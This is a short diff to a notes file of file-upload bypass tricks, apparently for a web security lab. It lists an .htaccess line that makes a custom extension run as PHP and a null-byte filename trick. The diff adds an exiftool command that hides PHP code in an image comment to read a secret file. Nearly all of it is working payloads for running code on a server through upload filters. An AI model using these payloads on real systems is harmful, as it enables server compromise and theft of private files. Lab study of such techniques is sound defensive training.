@@ -10,3 +10,5 @@ Content-Type: text/plain //content type
 AddType application/x-httpd-php .l33t //use this as content of the .htaccess file to enable php file as l33t extention which is php mod
 
 5. exploit.php%00.jpg
+
+6. exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
